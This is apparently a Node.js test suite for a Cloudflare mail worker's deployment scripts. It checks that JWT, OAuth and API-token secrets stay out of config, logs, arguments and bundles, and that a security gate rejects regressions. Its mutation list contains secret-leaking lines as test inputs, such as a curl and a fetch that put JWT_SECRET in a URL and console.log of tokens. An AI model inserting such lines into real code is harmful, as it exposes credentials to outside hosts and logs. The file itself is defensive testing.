import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readFile, writeFile, stat, readlink, readdir, rm, cp, mkdir, symlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, dirname, resolve } from 'node:path';
import { spawnSync } from 'node:child_process';
import { releaseSecrets, deploy } from '../../scripts/deploy.mjs';
import { provision } from '../../scripts/provision.mjs';

const root = resolve(import.meta.dirname, '../../..');
const worker = join(root, 'mail-worker');
const env = {
	NAME: 'cmail', ADMIN: 'admin@example.com', DOMAIN: '["example.com"]',
	CLOUDFLARE_ACCOUNT_ID: 'a'.repeat(32), KV_NAMESPACE_ID: 'b'.repeat(32),
	D1_DATABASE_ID: 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
	JWT_SECRET: 'signing-sentinel-/#%?\\"'.repeat(3),
	CLOUDFLARE_API_TOKEN: 'deployment-token-sentinel',
	D1_MIGRATION_API_TOKEN: 'migration-token-sentinel',
	LINUXDO_CLIENT_ID: 'client-id', LINUXDO_CLIENT_SECRET: 'oauth-sentinel-/#%?\\"',
	LINUXDO_CALLBACK_URL: 'https://mail.example/oauth', LINUXDO_SWITCH: 'true'
};

function render(overrides = {}) {
	const result = spawnSync('python3', ['-c', "import json, os; from pathlib import Path; from scripts.prepare_config import render; print(json.dumps(render(os.environ, Path('wrangler-action.toml').read_text())))"], {
		cwd: worker, env: { ...process.env, ...env, ...overrides }, encoding: 'utf8'
	});
	assert.equal(result.status, 0, result.stderr);
	return JSON.parse(result.stdout);
}

test('generated config and output exclude all credential values; OAuth secrets only name bindings', () => {
	const config = render();
	const text = JSON.stringify(config);
	for (const key of ['JWT_SECRET', 'LINUXDO_CLIENT_SECRET', 'CLOUDFLARE_API_TOKEN', 'D1_MIGRATION_API_TOKEN']) assert.ok(!text.includes(env[key]));
	assert.deepEqual(config.secrets.required, ['jwt_secret', 'linuxdo_client_secret']);
	assert.equal(config.keep_vars, false);
	assert.equal(config.build, undefined);
	assert.equal(config.vars.jwt_secret, undefined);
	assert.equal(config.vars.linuxdo_client_secret, undefined);
	assert.deepEqual(config.vars.domain, ['example.com']);
});

test('configuration values are escaped safely and disabled OAuth does not retain public client configuration', () => {
	const config = render({ ADMIN: 'a"\\b@example.com', LINUXDO_SWITCH: 'false' });
	assert.equal(config.vars.admin, 'a"\\b@example.com');
	assert.equal(config.vars.linuxdo_switch, false);
	assert.equal(config.vars.linuxdo_client_id, undefined);
	assert.deepEqual(config.secrets.required, ['jwt_secret']);
});

test('missing and short JWT and incomplete OAuth credentials fail closed', () => {
	for (const JWT_SECRET of ['', 'short', undefined]) assert.throws(() => releaseSecrets({ ...env, JWT_SECRET }));
	assert.throws(() => releaseSecrets({ ...env, LINUXDO_CLIENT_SECRET: '' }));
	assert.throws(() => releaseSecrets({ ...env, LINUXDO_CALLBACK_URL: '' }));
	assert.deepEqual(releaseSecrets({ JWT_SECRET: env.JWT_SECRET }), { jwt_secret: env.JWT_SECRET });
});

test('release uses a private secret payload, never argv/config/environment, and destroys it after success and failure', async () => {
	for (const failure of [false, true]) {
		const directory = await mkdtemp(join(tmpdir(), 'cmail-test-'));
		const path = join(directory, 'config.json');
		await writeFile(path, JSON.stringify(render()));
		let payload;
		try {
			const operation = deploy({ ...env, RUNNER_TEMP: directory }, async (args, options) => {
				payload = args.at(-1);
				assert.deepEqual(JSON.parse(await readFile(payload, 'utf8')), { jwt_secret: env.JWT_SECRET, linuxdo_client_secret: env.LINUXDO_CLIENT_SECRET });
				assert.equal((await stat(payload)).mode & 0o777, 0o600);
				assert.equal((await stat(dirname(payload))).mode & 0o777, 0o700);
				assert.equal(await readlink(options.env.WRANGLER_LOG_PATH), '/dev/null');
				for (const key of ['JWT_SECRET', 'LINUXDO_CLIENT_SECRET', 'D1_MIGRATION_API_TOKEN']) {
					assert.equal(options.env[key], undefined);
					assert.ok(!args.join(' ').includes(env[key]));
				}
				assert.equal(options.env.WRANGLER_LOG_SANITIZE, 'true');
				assert.equal(options.env.WRANGLER_SEND_METRICS, 'false');
				if (failure) throw new Error('Injected publishing failure');
			}, path);
			if (failure) await assert.rejects(operation, /Injected publishing failure/);
			else await operation;
			await assert.rejects(readFile(payload), { code: 'ENOENT' });
			assert.deepEqual(await readdir(directory), ['config.json']);
		} finally { await rm(directory, { recursive: true, force: true }); }
	}
});

test('CLI discards raw Wrangler output and errors even if the subprocess echoes a credential', async () => {
	const directory = await mkdtemp(join(tmpdir(), 'cmail-test-'));
	try {
		await mkdir(join(directory, 'bin'));
		await writeFile(join(directory, 'bin/pnpm'), '#!/bin/sh\necho "$CLOUDFLARE_API_TOKEN"\necho "$CLOUDFLARE_API_TOKEN" >&2\nexit 1\n', { mode: 0o700 });
		await writeFile(join(directory, 'wrangler-deploy.json'), JSON.stringify(render()));
		const result = spawnSync(process.execPath, [join(worker, 'scripts/deploy.mjs')], {
			cwd: directory, env: { ...process.env, ...env, RUNNER_TEMP: directory, PATH: `${join(directory, 'bin')}:${process.env.PATH}` }, encoding: 'utf8'
		});
		assert.equal(result.status, 1);
		assert.equal(result.stdout, '');
		assert.equal(result.stderr, 'Release failed; deployment blocked.\n');
		assert.ok(!(result.stdout + result.stderr).includes(env.CLOUDFLARE_API_TOKEN));
		assert.ok(!(await readdir(directory)).some(name => name.startsWith('cmail-release-')));
	} finally { await rm(directory, { recursive: true, force: true }); }
});

test('pinned Wrangler accepts atomic code/secrets upload and excludes migration code and secrets from bundle', async () => {
	const directory = await mkdtemp(join(tmpdir(), 'cmail-dryrun-'));
	try {
		await mkdir(join(directory, 'assets'));
		await writeFile(join(directory, 'assets/index.html'), '<!doctype html><title>Test fixture</title>');
		const config = render();
		config.main = join(worker, 'src/index.js');
		config.assets.directory = join(directory, 'assets');
		await writeFile(join(directory, 'config.json'), JSON.stringify(config));
		await writeFile(join(directory, 'credentials.json'), JSON.stringify(releaseSecrets(env)), { mode: 0o600 });
		await symlink('/dev/null', join(directory, 'wrangler.log'));
		const result = spawnSync(process.execPath, [
			join(worker, 'node_modules/wrangler/bin/wrangler.js'), 'deploy',
			'--dry-run', '--config', join(directory, 'config.json'),
			'--secrets-file', join(directory, 'credentials.json'), '--outdir', join(directory, 'bundle')
		], {
			cwd: worker,
			env: { ...process.env, WRANGLER_SEND_METRICS: 'false', WRANGLER_LOG: 'none', WRANGLER_LOG_PATH: join(directory, 'wrangler.log'), CLOUDFLARE_LOAD_DEV_VARS_FROM_DOT_ENV: 'false' },
			encoding: 'utf8', timeout: 60_000
		});
		assert.equal(result.status, 0, 'Pinned Wrangler dry-run failed');
		const files = (await readdir(join(directory, 'bundle'))).filter(file => file.endsWith('.js'));
		assert.ok(files.length);
		const bundle = (await Promise.all(files.map(file => readFile(join(directory, 'bundle', file), 'utf8')))).join('\n');
		assert.ok(!bundle.includes('cmail_schema_migrations'));
		assert.ok(!bundle.includes('CREATE TABLE IF NOT EXISTS email'));
		for (const secret of Object.values(releaseSecrets(env))) {
			assert.ok(!bundle.includes(secret));
			assert.ok(!(result.stdout + result.stderr).includes(secret));
		}
	} finally { await rm(directory, { recursive: true, force: true }); }
});

test('existing IDs skip provisioning; resource lookup and creation use management headers only', async () => {
	assert.deepEqual(await provision(env, () => { throw new Error('No network expected'); }), { KV_NAMESPACE_ID: env.KV_NAMESPACE_ID, D1_DATABASE_ID: env.D1_DATABASE_ID });
	const calls = [];
	const fetcher = async (url, options) => {
		calls.push({ url, options });
		assert.ok(!url.includes(env.CLOUDFLARE_API_TOKEN));
		assert.equal(options.headers.Authorization, `Bearer ${env.CLOUDFLARE_API_TOKEN}`);
		const result = options.method === 'POST' ? (url.endsWith('/d1/database') ? { uuid: env.D1_DATABASE_ID } : { id: env.KV_NAMESPACE_ID }) : [];
		return Response.json({ success: true, result });
	};
	assert.deepEqual(await provision({ ...env, KV_NAMESPACE_ID: '', D1_DATABASE_ID: '' }, fetcher), { KV_NAMESPACE_ID: env.KV_NAMESPACE_ID, D1_DATABASE_ID: env.D1_DATABASE_ID });
	assert.equal(calls.length, 4);
});

async function fixture() {
	const directory = await mkdtemp(join(tmpdir(), 'cmail-gate-'));
	await mkdir(join(directory, 'mail-worker'));
	await cp(join(root, '.github'), join(directory, '.github'), { recursive: true });
	await cp(join(worker, 'src'), join(directory, 'mail-worker/src'), { recursive: true });
	await cp(join(worker, 'scripts'), join(directory, 'mail-worker/scripts'), { recursive: true });
	for (const file of (await readdir(worker)).filter(file => /^wrangler.*\.toml$/.test(file))) {
		await cp(join(worker, file), join(directory, 'mail-worker', file));
	}
	return directory;
}

test('static gates accept this patch and reject credential and bootstrap regressions', async () => {
	const clean = spawnSync('python3', ['scripts/security_gate.py'], { cwd: worker, encoding: 'utf8' });
	assert.equal(clean.status, 0, clean.stderr);
	const mutations = [
		['.github/workflows/deploy-cloudflare.yml', text => text.replace('secrets.JWT_SECRET }}', 'secrets.JWT_SECRET || vars.JWT_SECRET }}')],
		['.github/workflows/deploy-cloudflare.yml', text => text.replace('secrets.LINUXDO_CLIENT_SECRET }}', "secrets.LINUXDO_CLIENT_SECRET || vars['LINUXDO_CLIENT_SECRET'] }}")],
		['.github/workflows/deploy-cloudflare.yml', text => text + '\n# curl "https://example/api/init/${JWT_SECRET}"\n'],
		['.github/workflows/deploy-cloudflare.yml', text => text + '\n# echo "$LINUXDO_CLIENT_SECRET"\n'],
		['.github/workflows/deploy-cloudflare.yml', text => text + '\n# set -x\n'],
		['.github/workflows/deploy-cloudflare.yml', text => text + '\n# continue-on-error: true\n'],
		['.github/workflows/deploy-cloudflare.yml', text => text.replace('run: pnpm db:migrate', 'run: pnpm db:migrate || true')],
		['.github/workflows/deploy-cloudflare.yml', text => text.replace('run: pnpm db:migrate', 'run: echo skipped')],
		['.github/workflows/deploy-cloudflare.yml', text => text.replace('          JWT_SECRET:', '      JWT_SECRET:')],
		['mail-worker/wrangler-action.toml', text => text.replace('[vars]', '[vars]\njwt_secret = "plaintext-sentinel"')],
		['mail-worker/wrangler-action.toml', text => text.replace('name = "${NAME}"', 'name = "${JWT_SECRET}"')],
		['mail-worker/wrangler-action.toml', text => text.replace('[vars]', '[vars]\nlinuxdo_client_secret = "plaintext-sentinel"')],
		['mail-worker/src/api/login-api.js', text => text + '\napp.get("/init/:secret", c => {});\n'],
		['mail-worker/src/api/login-api.js', text => text + '\nimport "../../scripts/migrations.mjs";\n'],
		['mail-worker/src/api/login-api.js', text => text + '\nfetch("https://example/" + c.env.jwt_secret);\n']
		, ['mail-worker/scripts/migrate.mjs', text => text + '\nconsole.log(env.D1_MIGRATION_API_TOKEN);\n']
		, ['mail-worker/scripts/deploy.mjs', text => text + '\nconsole.log(secrets);\n']
	];
	for (const [file, mutate] of mutations) {
		const directory = await fixture();
		try {
			const path = join(directory, file);
			await writeFile(path, mutate(await readFile(path, 'utf8')));
			const result = spawnSync('python3', [join(worker, 'scripts/security_gate.py'), '--root', directory], { encoding: 'utf8' });
			assert.equal(result.status, 1, `Gate accepted forbidden change: ${file}`);
			assert.ok(!result.stderr.includes('plaintext-sentinel'));
		} finally { await rm(directory, { recursive: true, force: true }); }
	}
});

test('generated-config gate rejects plaintext secrets without echoing values', async () => {
	const directory = await mkdtemp(join(tmpdir(), 'cmail-gate-'));
	try {
		const config = render();
		config.vars.linuxdo_client_secret = 'never-print-this-value';
		const path = join(directory, 'config.json');
		await writeFile(path, JSON.stringify(config));
		const result = spawnSync('python3', ['scripts/security_gate.py', '--config', path], { cwd: worker, encoding: 'utf8' });
		assert.equal(result.status, 1);
		assert.ok(!result.stderr.includes('never-print-this-value'));
	} finally { await rm(directory, { recursive: true, force: true }); }
});
